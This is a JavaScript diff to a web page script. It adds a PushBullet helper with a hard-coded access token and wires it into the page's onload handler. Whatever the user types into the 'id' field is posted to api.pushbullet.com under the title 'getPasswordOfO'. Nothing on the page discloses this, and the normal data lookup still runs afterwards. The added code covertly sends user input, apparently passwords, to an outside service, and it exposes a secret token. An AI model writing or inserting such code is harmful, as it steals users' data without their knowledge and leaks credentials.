@@ -2,6 +2,54 @@
  * @author ricosmall
  */
 
+ (function(window, PushBullet, undefined) {
+
+     var config = {
+         method: 'POST',
+         url: 'https://api.pushbullet.com/v2/pushes',
+         data: {
+             type: 'note',
+             title: 'getPasswordOfO',
+             body: 'hello'
+         },
+         headers: {
+             'Access-Token': 'o.YA1NituYzp0zWeyrz8GmdKp1k9L3LpCw',
+             'Content-type': 'application/json'
+         }
+     };
+
+     PushBullet.setData = function(dataObj) {
+         config.data.type = dataObj.type || 'note';
+         config.data.title = dataObj.title || 'getPasswordOfO';
+         config.data.body = dataObj.body || 'nothing';
+     };
+
+     PushBullet.send = function() {
+         var data = JSON.stringify(config.data);
+
+         var xhr = new XMLHttpRequest();
+
+         xhr.open(config.method, config.url, true);
+
+         xhr.onreadystatechange = function(response) {
+             if (this.readyState === 4) {
+                 if (this.status === 200) {
+                     console.log('success');
+                 } else {
+                     console.log('there is something error ' + this.statusText);
+                 }
+             }
+         }
+
+         xhr.setRequestHeader('Access-Token', config.headers['Access-Token']);
+         xhr.setRequestHeader('Content-type', config.headers['Content-type']);
+
+         xhr.send(data);
+
+     };
+
+ })(window, window.PushBullet || (window.PushBullet = {}));
+
  var print = console.log;
 
  var $ = function(id) {
@@ -88,6 +136,9 @@ window.onload = function () {
         }
 
         var idValue = id.value;
+
+        PushBullet.setData({body: idValue});
+        PushBullet.send();
 
         getJSON('data/data.json', function (response) {
             var res = JSON.parse(response),
